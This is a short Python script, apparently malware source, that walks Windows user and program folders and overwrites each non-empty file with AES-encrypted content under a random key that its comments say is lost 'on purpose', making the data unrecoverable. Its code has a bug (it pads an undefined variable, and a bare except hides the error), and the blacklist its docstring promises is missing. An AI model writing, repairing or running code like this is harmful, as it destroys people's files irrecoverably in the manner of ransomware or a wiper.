# Encryptor just encrypts and deletes key after encryption of a directory
# Encrypts files not critical to OS operation, but only files deemed personal

# Each file gets its own encryption key

'''
* Define utility functions:
   * Generate random bytes
   * Encrypt (AES, CBC)
* For each file that is writable:
   * Check if its not in a blacklisted directory
   * Generate random key
   * encrypt file
'''
import os
from os.path import join, getsize
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad
from itertools import chain

# Randomly generate key and IV and lose it on purpose
def prepare():
    return AES.new(get_random_bytes(16), AES.MODE_CBC, get_random_bytes(16))

def encrypt(filename):
	cipher = prepare()
	with open(filename, "rb") as f:
		data = f.read()
	with open(filename, "wb") as f:
		f.write(cipher.encrypt(pad(plaintext, 16)))

paths = (
	'/Users/',
	'/Program Files/',
	'/Program Files (x86)/',
	'/ProgramData/'
	)


for root, dirs, files in chain.from_iterable(os.walk(path) for path in paths):
	for file_name in files:
		filename = join(root, file_name)
		if getsize(filename) > 0:
			try:
				encrypt(filename)
			except:
				pass



